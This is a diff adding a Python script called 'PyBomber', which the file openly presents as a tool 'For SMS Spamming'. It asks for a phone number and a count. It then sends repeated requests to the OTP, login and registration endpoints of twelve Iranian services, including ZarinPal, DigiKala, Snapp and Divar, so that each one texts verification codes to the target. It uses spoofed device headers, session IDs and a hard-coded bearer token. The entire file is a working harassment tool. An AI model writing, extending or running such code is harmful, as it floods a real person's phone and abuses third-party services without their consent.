@@ -1,0 +1,433 @@
+#Created By Mr Sadeghi 
+#My GitHub ID ==> sir-sadeghi
+
+from requests import ConnectionError
+import requests
+import datetime
+import time
+import random
+import os
+import platform
+from colorama import init
+
+
+if(platform.uname()[0]) == "Windows":
+    init()
+
+def Banner():
+    cb = "\033[34;1m"
+    cby = "\033[36;1m"
+    cg="\033[2;1m"
+    cy="\033[33;1m"
+    cmg="\033[35;1m"
+    cr="\033[31;1m"
+    cw = "\033[0;m"
+
+    banner = f"""
+{cb} ______       ______              _                 
+{cby}(_____ \     (____  \            | |                
+{cb} _____) )   _ ____)  ) ___  ____ | |__  _____  ____ 
+{cby}|  ____/ | | |  __  ( / _ \|    \|  _ \| ___ |/ ___)
+{cb}| |    | |_| | |__)  ) |_| | | | | |_) ) ____| |    
+{cby}|_|     \__  |______/ \___/|_|_|_|____/|_____)_|    
+{cb}       (____/                                       
+    
+    """
+    print(banner,cw)
+    print(f"{cr}*{cb}){cy}=========================={cmg}[{cb}PyBomber{cmg}]{cy}=========================={cb}({cr}*",cw)
+    print(f"{cby}Created {cb}By {cy}: {cw}@coding_maestro",cw)
+    print(f"{cb}P{cby}y{cb}B{cby}o{cb}m{cby}b{cb}e{cby}r {cy}For SMS Spamming {cg}!!!",cw)
+    print(f"{cr}*{cb}){cy}=========================={cmg}[{cb}PyBomber{cmg}]{cy}=========================={cb}({cr}*",cw)
+
+
+class SMSBomber:
+    def __init__(self, ranges, phone):
+        try:
+            int(ranges)
+        except ValueError:
+            if (platform.uname()[0]) == "Linux":
+                os.system("clear")
+            if (platform.uname()[0]) == "Windows":
+                os.system("cls")
+            print("\033[31;1mInvalid Argument\033[0;m Please Try Again \033[33;1m!!!")
+            time.sleep(3)
+            os._exit(0)
+        else:
+            self.ranges = int(ranges)
+            if phone.isdigit() == False:
+                if (platform.uname()[0]) == "Linux":
+                    os.system("clear")
+                if (platform.uname()[0]) == "Windows":
+                    os.system("cls")
+                print("\033[31;1mInvalid Argument\033[0;m Please Try Again \033[33;1m!!!")
+                time.sleep(3)
+                os._exit(0)
+            else:
+                if (len(phone)) < 11: 
+                    self.phone = phone
+                else:
+                    if (platform.uname()[0]) == "Linux":
+                        os.system("clear")
+                    if (platform.uname()[0]) == "Windows":
+                        os.system("cls")
+                    print("\033[31;1mInvalid Argument\033[0;m Please Try Again \033[33;1m!!!")
+                    time.sleep(3)
+                    os._exit(0)
+    
+
+    def __Requester__(self, URL, HD, DT, MD, MO="json"):
+        try:
+            if MO == "json":
+                res=requests.post(URL, headers=HD, json=DT)
+            if MO == "data":
+               res=requests.post(URL, headers=HD, data=DT)
+            if MO == "get":
+               res=requests.get(URL, headers=HD)
+        except ConnectionError:
+            try:
+                if MO == "json":
+                    res=requests.post(URL, headers=HD, json=DT)
+                if MO == "data":
+                   res=requests.post(URL, headers=HD, data=DT)
+                if MO == "get":
+                   res=requests.get(URL, headers=HD)
+            except ConnectionError:
+                try:
+                    if MO == "json":
+                        res=requests.post(URL, headers=HD, json=DT)
+                    if MO == "data":
+                       res=requests.post(URL, headers=HD, data=DT)
+                    if MO == "get":
+                       res=requests.get(URL, headers=HD)
+                except ConnectionError:
+                    now_time = datetime.datetime.now().strftime("%H : %M : %S")
+                    print(f"\033[34;1m[\033[33;1m{now_time}\033[34;1m]\033[37;1m==\033[35;1m|\033[32;1m{MD}\033[35;1m|\033[36;1mNaraft To Matehatesh :(")
+                else:
+                    if res.status_code == 200:
+                        now_time = datetime.datetime.now().strftime("%H : %M : %S")
+                        print(f"\033[34;1m[\033[33;1m{now_time}\033[34;1m]\033[37;1m==\033[35;1m|\033[32;1m{MD}\033[35;1m|\033[36;1mRaft To Matehatesh :)")
+                    else:
+                        now_time = datetime.datetime.now().strftime("%H : %M : %S")
+                        print(f"\033[34;1m[\033[33;1m{now_time}\033[34;1m]\033[37;1m==\033[35;1m|\033[32;1m{MD}\033[35;1m|\033[36;1mNaraft To Matehatesh :(")
+            else:
+                if res.status_code == 200:
+                    now_time = datetime.datetime.now().strftime("%H : %M : %S")
+                    print(f"\033[34;1m[\033[33;1m{now_time}\033[34;1m]\033[37;1m==\033[35;1m|\033[32;1m{MD}\033[35;1m|\033[36;1mRaft To Matehatesh :)")
+                else:
+                    now_time = datetime.datetime.now().strftime("%H : %M : %S")
+                    print(f"\033[34;1m[\033[33;1m{now_time}\033[34;1m]\033[37;1m==\033[35;1m|\033[32;1m{MD}\033[35;1m|\033[36;1mNaraft To Matehatesh :(")
+        else:
+            if res.status_code == 200:
+                now_time = datetime.datetime.now().strftime("%H : %M : %S")
+                print(f"\033[34;1m[\033[33;1m{now_time}\033[34;1m]\033[37;1m==\033[35;1m|\033[32;1m{MD}\033[35;1m|\033[36;1mRaft To Matehatesh :)")
+            else:
+                now_time = datetime.datetime.now().strftime("%H : %M : %S")
+                print(f"\033[34;1m[\033[33;1m{now_time}\033[34;1m]\033[37;1m==\033[35;1m|\033[32;1m{MD}\033[35;1m|\033[36;1mNaraft To Matehatesh :(")
+
+
+    def __ZarinPal__(self):
+        
+        list_user_agent = [
+                           "ZarinPal/4.0 (Android Mobile; Android 7.1.0;samsung samsung;A30;ZarinPalApp-V4/4.0.51) ZarinPalApp-V4/4.0.51",
+                           "ZarinPal/4.0 (Android Mobile; Android 7.1.0;samsung samsung;A50;ZarinPalApp-V4/4.0.51) ZarinPalApp-V4/4.0.51",
+                           "ZarinPal/4.0 (Android Mobile; Android 6.0.1;samsung samsung;A10;ZarinPalApp-V4/4.0.51) ZarinPalApp-V4/4.0.51"
+                          ]
+        
+        user_agent = random.choice(list_user_agent)
+        
+        ZarinHeader = {
+                        "Host": "next.zarinpal.com",
+                        "accept": "application/json",
+                        "user-agent": user_agent,
+                        "content-type": "application/json; charset\u003dUTF-8",
+                        "content-length": "80",
+                        "accept-encoding": "gzip"
+                      }
+        
+        zarin_phone = self.phone
+        zarin_phone = "0" + zarin_phone
+        
+        ZarinData = {"first_name":"محمدی","last_name":"حمیدی","cell_number":zarin_phone}
+        "https://next.zarinpal.com/api/oauth/register"
+        
+        self.__Requester__(URL="https://next.zarinpal.com/api/oauth/register", HD=ZarinHeader, DT=ZarinData, MD="ZarinPal")
+
+    def __DigiKala__(self):
+        list_session_id = [
+                           "MTM0MjAzMDg0MjE5MTI6NTk4YmQ4ZGQyYzFlNTMzNDY0YTUxMzA3Y2UzODZhMGM",
+                           "MTU0MjAzMDg0MjE5MTI6NTk4YmQ4ZGQyYzFlNTMzNDY0YTUxMzA3Y2UzODZhMGM"
+                          ]
+        list_user_agent = [
+                           "Mozilla/5.0 (Linux; Android 7.1.0; A30 Build/MNB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Safari/537.36",
+                           "Mozilla/5.0 (Linux; Android 5.1.0; A6 Build/MNB19M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4464.104 Safari/537.36"
+                          ]
+        session_id = random.choice(list_session_id)
+        user_agent = random.choice(list_user_agent)
+        
+        DigiKalaHeader = {
+                          "Host": "sirius.digikala.com",
+                            "client": "android",
+                            "clientid": "5e40e4fd2985c2cf",
+                            "applicationversion": "85",
+                            "pixelratio": "1.3312500715255737",
+                            "x-bellatrix": "true",
+                            "credentials": "include",
+                            "supernova-optimize-response": "1",
+                            "user-agent": user_agent,
+                            "sessionid": session_id + "\u003d",
+                            "globaluserid": session_id + "\u003d",
+                            "authorization": "",
+                            "content-type": "application/json",
+                            "content-length": "49",
+                            "accept-encoding": "gzip",
+                            "cookie": "tracker_global\u003d4F5w6KkM; tracker_session\u003d4F5w6KkM; TS0117d8ef\u003d0102310591a6123c029563c8cd84ffbefc12e8cb115acde3c55e4cce3bddaea94b478bbb6e3a14265adf7834c9e4c1c37cfc76dfcc819557b0ffe03414133dab7a1a75dac27f83fafae405fe76c5dfdcb3a398e3c8"
+                         }
+        digi_phone = self.phone
+        digi_phone = "0" + digi_phone
+        digi_data = {"username":digi_phone,"force_send_otp":False}
+        "https://sirius.digikala.com/v1/user/authentication/"
+        self.__Requester__(URL="https://sirius.digikala.com/v1/user/authentication/", HD=DigiKalaHeader, DT=digi_data, MD="DigiKala")
+
+    def __Esam__(self):
+        EsamHeader = {
+                      "Host": "api.esam.ir",
+                      "content-type": "application/json; charset\u003dUTF-8",
+                      "content-length": "110",
+                      "accept-encoding": "gzip",
+                      "user-agent": "okhttp/4.5.0"
+                     }
+        esam_phone = self.phone
+        esam_phone = "0" + esam_phone
+        
+        esam_data = {"mobile":esam_phone,"present_type":"AndroidApp","registration_method":1,"serialNumber":"5e40e4fd2985e2cf"}
+        self.__Requester__(URL="https://api.esam.ir/api/account/RegisterOrLogin", HD=EsamHeader, DT=esam_data, MD="Esam")
+
+    def __Ewano__(self):
+        EwanoHeader = {
+                      "Host": "api-ebcom.mci.ir",
+                      "authorization": "Bearer",
+                      "content-type": "application/json; charset\u003dUTF-8",
+                      "content-length": "49",
+                      "accept-encoding": "gzip",
+                      "user-agent": "okhttp/3.14.7"
+                      }
+        ewano_phone = self.phone
+        ewano_data = {"appcode":"[vzNSAIvMufO]","msisdn":ewano_phone}
+        self.__Requester__(URL="https://api-ebcom.mci.ir/services/auth/v1.0/otp", HD=EwanoHeader, DT=ewano_data, MD="Ewano")
+                
+    def __Ghabzinoo__(self):
+        
+        list_user_agent = [
+                           "BuildVersion:(7.1.0) Brand:(samsung) Model:(A50) Device:(A50_2) AppVersion:(1.3.0) Sign:(u5JQWRGP1GC)",
+                           "BuildVersion:(10.0.0) Brand:(samsung) Model:(A70) Device:(A70_2) AppVersion:(1.3.0) Sign:(u5JQWRGP1GC)",
+                          ]
+        
+        user_agent = random.choice(list_user_agent)
+        
+        GhabzinooHeader = {
+                           "Host": "application2.billingsystem.ayantech.ir",
+                           "user-agent": user_agent,
+                           "content-type": "application/json; charset\u003dUTF-8",
+                           "content-length": "139",
+                           "accept-encoding": "gzip"
+                           }
+
+        ghabzinoo_phone = self.phone
+        ghabzinoo_phone = "0" + ghabzinoo_phone
+        ghabzinoo_data = {"Parameters":{"ApplicationType":"Android","ApplicationUniqueToken":"playstore","ApplicationVersion":"1.3.0","MobileNumber":ghabzinoo_phone}}
+        
+        self.__Requester__(URL="https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/RequestActivationCode", HD=GhabzinooHeader, DT=ghabzinoo_data, MD="Ghabzinoo")
+    
+    def __Sheypoor__(self):
+        
+        list_user_agent = [
+                           "Android/7.1.0 Sheypoor/6.4.2 VersionCode/6040200 Manufacturer/smasung Model/A50",
+                           "Android/10.0.0 Sheypoor/6.4.2 VersionCode/6040200 Manufacturer/smasung Model/A70"
+                          ]
+        
+        user_agent = random.choice(list_user_agent)
+        
+        SheypoorHeader = {
+                          "Host": "www.sheypoor.com",
+                          "api-version": "v6.4.2",
+                          "app-version": "6.4.2",
+                          "user-agent": user_agent,
+                          "phone-base": "true",
+                          "x-agent-type": "Android App",
+                          "x-build-mode": "Release",
+                          "x-flavor": "playStore",
+                          "unique-id": "9031dd55-7296-37cd-8e21-df2a9e27df66",
+                          "content-type": "application/json; charset\u003dUTF-8",
+                          "content-length": "26",
+                          "accept-encoding": "gzip"
+                         }
+        
+        sheypoor_phone = self.phone
+        sheypoor_phone = "0" + sheypoor_phone
+        
+        sheypoor_data = {"username":sheypoor_phone}
+        self.__Requester__(URL="https://www.sheypoor.com/api/v6.4.2/auth/state-request", HD=SheypoorHeader, DT=sheypoor_data, MD="Sheypoor")
+
+    def __SnapFood__(self):
+        SnapFoodHeader = {
+                          "Host": "newapi.zoodfood.com",
+                          "authorization": "Bearer eyl0eXAiOiJKV1QiLCjhbGciOiJSUzI1NiIhImp0aSI6IjAwODRiNzdiMmMxNTljOTVlMDJhYjBhZTM5YTk3N2ZjOWE4YmNiODM5NWRmMzM2ZmYxYzVhZThkZmQ3NDJiYmM2NTIwNTAwY2I4YzY5MjA4In0.eyJhdWQiOiJzbmFwcGZvb2RfYW5kcm9pZCIsImp0aSI6IjAwODRiNzdiMmMxNTljOTVlMDJhYjBhZTM5YTk3N2ZjOWE4YmNiODM5NWRmMzM2ZmYxYzVhZThkZmQ3NDJiYmM2NTIwNTAwY2I4YzY5MjA4IiwiaWF0IjoxNjQyMDM0NjcxLCJuYmYiOjE2NDIwMzQ2NzEsImV4cCI6MTY0NDcxMzE5MSwic3ViIjoiIiwic2NvcGVzIjpbIm1vYmlsZV92MiIsIm1vYmlsZV92MSIsIndlYnZpZXciXX0.EeX-Aq8BEYObsjoU24lA7V5fM5MjnbvYSsd98hReWwBU36P3noDGcGM4hBAmWGzxTMOl7ZOyYAIydGjJh8YMJavE1JxAyUTdxfeKvGBONmNqLnpWy1aAtRjwAtvA33Vk5xaR-mDve2bLRYRivKa8X-TrJeaS8BewDR3edaXgoCfheRNBr6Yhtr11EqoQXVNqFqYcDvI0Y5B_QXFdTHBttZDrpgHkaHoyJwpsGi9H2y3O303Lct-xWvDcRuBh0DNA73aH9-pUCPV-hw697NzRY6e4lyf3i1QmPoduauekpPC7Pnlg-wZMjjF3U2qi0GXFB4Z515Vc8PxjXgze1gY8v4pEyc6H-m5KkoOmVL5d_7uvXn6UFNAc2rDfBIFC9UcbDFA8ZkW9NEADgwy1Av6ULT9WtXjUOgkLMmL-5K4bBY2VB-2Xr5EAr-Grf4ZIFELmou4cW9Pq9DqOuCoPocsb1d2xjgBzeNHj-iBhw6wWzqZi2N5amkxjl_ehv6UmEl6LVK4AzOXSsQUdCz-1tQdQP-AUVfOdhoggQGgM4e9KgI1vJCfxb2IEnIyM-6kIF3W3_M4zaAy6R7wg9_pr1BsAr07K4M4GmxKD1YAEAbTIvq7556XT6yETdQdBupKO3umuMr-3tLC4Hy_Y3yBGO9XwHR9Hk1QaU4q7IbAY8_a0xCHXtLdptbs5JQwDWPzxlgjJ_sv-aEAZg46CsISmA_wZ922Xr-rOABwYaYOdoXMXhZyEDQI0UuVv85pxgKs6SAV6497ToUl5w_r8CW5n0TAqcEQKL3Ul2rKnFDH4VJwZ9PhSqXy1DI52VFY5a7sHjhq-fL-JWK5V71_U98D8V6ofVuquc_dU9nU_0bdcMTHxpp-r-7Ob9pxh_szC7_nfoC9wAb9VfJ_mClL5g5RvE42bHkqb2Hop8SXjKj8pLOoTIk23_Bn7xTjcatygohvP1IDqVQTzqZp6rBz4egGlFtgr4fnRGbmfANADqADVqeux58vl6ESF6SOmT6Z2cvMZT6jOaD16deqxmX9Josq7CQ1koMwSwfoV-XGaYI66ztcIpgxw-bl41LSME9EKelxmCuuG5HhTKzmm9Co_FpM8Y8OYu9Liy4rqWu_vGAuyDgT7G0i9YCAvUuXE4x88Jo0BU-862twHja8kimpKC3IYNg_oQ6Eh2e2j3FJWRsD9f0eNGzFvc5IvVZVdHQ1dT2vV3abeAngdyDu579grHlK1_K5yE0CLfsMn7y9CkGfHKumTQIO4MI9FQJeAbk0FwneclIiNkTkgoimGe02gV87ED1Y-vjHdgZd5lPBJyMzP6DQInR7VzEgawZfKGseqdHzxhoVmx73AGGdSEx-AF2iHUt7vOx1eBNsb8yexzTMwpATjT7GskKUwhzug8fXZ-vw5bHRKyPRKlaB14tUSmv_C9ITqo3Z7XRr7iRn1jqYwcWPT0pukmbILNl6LF1A9G9GXxCDM07aJcm1ou0ZbI3nwAHjOn0nuUpB_GMrTLRgezC3rxn3RoAWlcxieeFAC6ln9adQkb9XlWHYnunxHx9ITrTBcabv9KkFjRQynKi7KXCTakpjRatJ1R32QeKcCLhPjdeHAvvOQ_WLiMvISHvLUYGIOvyv8DDqEb1-YcFavJH3ZYD_FryNXX5S8LA5V0t7XR16hb0iQAgHuhREW6LSQRiR-ob16Q9ZJyteU_Bzge6DP_qG0AQf-8QI7dJkBUviAGlM_Idnpgqc2_lQ6N2q3GUQ4J4vUpLV6tAOuzBn-I8X8jtKS0Nn1aB0NtPBb_jNN_dV9BPQq5pRbPyFRaEGoCj8a_5iGsLhH7PUPmeYzQ7IJPvH_2phLPqoaIr_xsTzM3Q-QCi_nfD_vv8JPgka6P7NSDfIyUY2ShdjZPT_BhZdBJfmokzXvuhu7K5jAETcZ-mFvuL3LWvQ4zwgGRJLCesiQgp-2VGdfLAPTR2g61J5xrRQNnAzz537avHAMCVncGQoV386QpGbpr76lR5IaIQxdjAopYv9y1mzDkUms0QnZLyrKUik0e6UtML9p4FgqombT5ZC8m3Svmw-N0KRq4IHjXkNA_jedrDmOcL5NUpJq2oKHUtFQLCqvxqVotM7CqJj_yLdh6_sSl26e8g6uU-uHmvGhu2hzxbOMMnFILFk3dHqEs3gSy0nMjRhDpHEPFuyvkNtkLMprzI65sIDF6BpD5shTf_NWrXC7rr8NawBhTka49fdrwthJrgodtNfMBxQ8XvWnS9BbtU8fo0DV4VfYlAlP4qC0sSUwYPrgG1z3VHz_xfDic2gqP1O-n_Pa6V_s9m2ooHjzsUyvcR5QacuzJtR0A32u05T8tg5U_iPyT5TyBBEpZ8IHutqh5YLT40Cu2patY5Zr2CZH_H3DvUZe4rOg10P7ibdeNJ9y_toaxu7ZGjy01C8NUv1pMZYyp2eFsid86zZX99JLwYhcJBqYehVXkVKBqagvko8uQzJ7ALvqEDseLLHkIbEYLfvygoM-va2VFy0tO_66BU5UlE-UHyxs8v6LpvsLHsigcP8gSwvZyVaRMyS7IdyAZJi_so4gmwuDjrTDI4hivgV1P2IS3nuVOcNV3NxfcirT6iyHjDQefSNNNbxdSUFgze-towtMjpHpGNFm-ujaZ6Ad04Xaba69S1rBRl3yFjPn-k8MW-Xw4P6GN5VOgrfAAWO3TvZqR_Yru4CtYihzvvEdtmgnSIyj4WqFM7Ny5NNnTPEg8Co",
+                          "content-type": "application/x-www-form-urlencoded",
+                          "content-length": "158",
+                          "accept-encoding": "gzip",
+                          "user-agent": "okhttp/3.12.12"
+                         }
+        
+        snapfood_data = {"cellphone":self.phone}
+        
+        self.__Requester__(URL="https://newapi.zoodfood.com/mobile/v2/user/loginMobileWithNoPass", HD=SnapFoodHeader, DT=snapfood_data, MD="SnapFood", MO="data")
+
+    def __Snap__(self):
+        
+        SnapHeader = {
+                      "Host": "app.snapp.taxi",
+                      "content-length": "29",
+                      "x-app-name": "passenger-pwa",
+                      "x-app-version": "5.0.0",
+                      "app-version": "pwa",
+                      "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
+                      "content-type": "application/json",
+                      "accept": "*/*",
+                      "origin": "https://app.snapp.taxi",
+                      "sec-fetch-site": "same-origin",
+                      "sec-fetch-mode": "cors",
+                      "sec-fetch-dest": "empty",
+                      "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F",
+                      "accept-encoding": "gzip, deflate, br",
+                      "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6",
+                      "cookie": "_gat\u003d1"
+                      }
+        
+        snap_data = {"cellphone":self.phone}
+        
+        self.__Requester__(URL="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", HD=SnapHeader, DT=snap_data, MD="Snap")
+
+    def __Igap__(self):
+        IgapHeader = {
+                      "Host": "core.gap.im",
+                      "accept": "application/json, text/plain, */*",
+                      "x-version": "4.5.7",
+                      "accept-language": "fa",
+                      "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
+                      "appversion": "web",
+                      "origin": "https://web.gap.im",
+                      "sec-fetch-site": "same-site",
+                      "sec-fetch-mode": "cors",
+                      "sec-fetch-dest": "empty",
+                      "referer": "https://web.gap.im/",
+                      "accept-encoding": "gzip, deflate, br"
+                      }
+       
+        igap_phone = self.phone
+        igap_phone = "98" + igap_phone
+        
+        self.__Requester__(URL=f"https://core.gap.im/v1/user/add.json?mobile=%2B{igap_phone}", HD=IgapHeader, DT="", MD="Igap", MO="get")
+    
+    def __Tap30__(self):
+        Tap30Header = {
+                       "Host": "tap33.me",
+                       "Connection": "keep-alive",
+                       "Content-Length": "63",
+                       "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
+                       "content-type": "application/json",
+                       "Accept": "*/*",
+                       "Origin": "https://app.tapsi.cab",
+                       "Sec-Fetch-Site": "cross-site",
+                       "Sec-Fetch-Mode": "cors",
+                       "Sec-Fetch-Dest": "empty",
+                       "Referer": "https://app.tapsi.cab/",
+                       "Accept-Encoding": "gzip, deflate, br",
+                       "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"
+                       }
+        
+        tap30_phone = self.phone
+        tap30_phone = "0" + tap30_phone
+        
+        tap30_data = {"credential":{"phoneNumber":tap30_phone,"role":"PASSENGER"}}
+        
+        self.__Requester__(URL="https://tap33.me/api/v2/user", HD=Tap30Header, DT=tap30_data, MD="Tap30")
+
+    def __Divar__(self):
+        DivarHeader = {
+                       "Host": "api.divar.ir",
+                       "Connection": "keep-alive",
+                       "Content-Length": "22",
+                       "Accept": "application/json, text/plain, */*",
+                       "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
+                       "Content-Type": "application/x-www-form-urlencoded",
+                       "Origin": "https://divar.ir",
+                       "Sec-Fetch-Site": "same-site",
+                       "Sec-Fetch-Mode": "cors",
+                       "Sec-Fetch-Dest": "empty",
+                       "Referer": "https://divar.ir/my-divar/my-posts",
+                       "Accept-Encoding": "gzip, deflate, br",
+                       "Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"
+                       }
+           
+        divar_data = {"phone":self.phone}
+           
+        self.__Requester__(URL="https://api.divar.ir/v5/auth/authenticate", HD=DivarHeader, DT=divar_data, MD="Divar")
+      
+    def __Torob__(self):
+        TorobHeader = {
+                       "Host": "api.torob.com",
+                       "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
+                       "accept": "*/*",
+                       "origin": "https://torob.com",
+                       "sec-fetch-site": "same-site",
+                       "sec-fetch-mode": "cors",
+                       "sec-fetch-dest": "empty",
+                       "referer": "https://torob.com/user/",
+                       "accept-encoding": "gzip, deflate, br",
+                       "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6",
+                       "cookie": "amplitude_id_95d1eb61107c6d4a0a5c555e4ee4bfbbtorob.com\u003deyJkZXZpY2VJZCI6ImFiOGNiOTUyLTk1MTgtNDhhNS1iNmRjLTkwZjgxZTFjYmM3ZVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5Njg2OTI4ODM1MSwibGFzdEV2ZW50VGltZSI6MTU5Njg2OTI4ODM3NCwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjN9"
+                       }
+            
+        torob_phone = self.phone
+        torob_phone = "0" + torob_phone
+        self.__Requester__(URL=f"https://api.torob.com/a/phone/send-pin/?phone_number={torob_phone}", HD=TorobHeader, DT="", MD="Torob", MO="get")
+    
+    def Bomber(self):
+        list_sms_sender = ["ZarinPal", "DigiKala", "Esam", "Ewano", "Ghabzinoo", "Sheypoor", "SnapFood", "Snap", "Igap", "Tap30", "Divar", "Torob"]
+        for i in range(self.ranges):
+            sender = random.choice(list_sms_sender)
+            if sender == "ZarinPal":
+                self.__ZarinPal__()
+            if sender == "DigiKala":
+                self.__DigiKala__()
+            if sender == "Esam":
+                self.__Esam__()
+            if sender == "Ewano":
+                self.__Ewano__()
+            if sender == "Ghabzinoo":
+                self.__Ghabzinoo__()
+            if sender == "Sheypoor":
+                self.__Sheypoor__()
+            if sender == "SnapFood":
+                self.__SnapFood__()
+            if sender == "Snap":
+                self.__Snap__()
+            if sender == "Igap":
+                self.__Igap__()
+            if sender == "Tap30":
+                self.__Tap30__()
+            if sender == "Divar":
+                self.__Divar__()
+            if sender == "Torob":
+                self.__Torob__()
+
+Banner()
+print("""
+      Example Number ==> 9120000000
+      """)
+phone_number = input("Your Phone Number : ")
+range_spam = input("Your Range For Send SMS : ")
+
+spammer = SMSBomber(range_spam, phone_number)
+spammer.Bomber()
+    
